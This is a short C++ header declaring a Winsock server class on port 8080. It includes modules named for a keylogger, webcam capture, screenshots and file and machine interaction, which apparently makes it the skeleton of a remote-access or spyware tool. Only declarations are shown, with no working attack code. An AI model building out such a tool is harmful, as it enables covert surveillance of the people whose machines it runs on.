#pragma once

#include "utils.h"
#include "screenshot_thread.h"
#include "files_interaction.h"
#include "keylogger_thread.h"
#include "webcam_thread.h"
#include "machine_interactions.h"
#include "app_service_interactions.h"

const int port = 8080;
const int bufferSize = 8192;

class Server {
private:
	WSADATA wsaData;
	SOCKET server_fd;
	SOCKET client_socket;
	struct sockaddr_in address;
	bool isRunning;

	// Function to get the active IPv4 address of the machine
	string getActiveIPv4Address();

	// Function to handle client communication
	void handleClientCommunication();

public:
	Server() {};

	// Function to initialize the server
	bool initialize();

	// Function to bind the socket
	bool bindSocket();

	// Function to listen and accept incoming connections
	void listenAndAccept();

	// Function to shutdown the server
	void shutdownServer();

	~Server() {
		shutdownServer();
	}
};
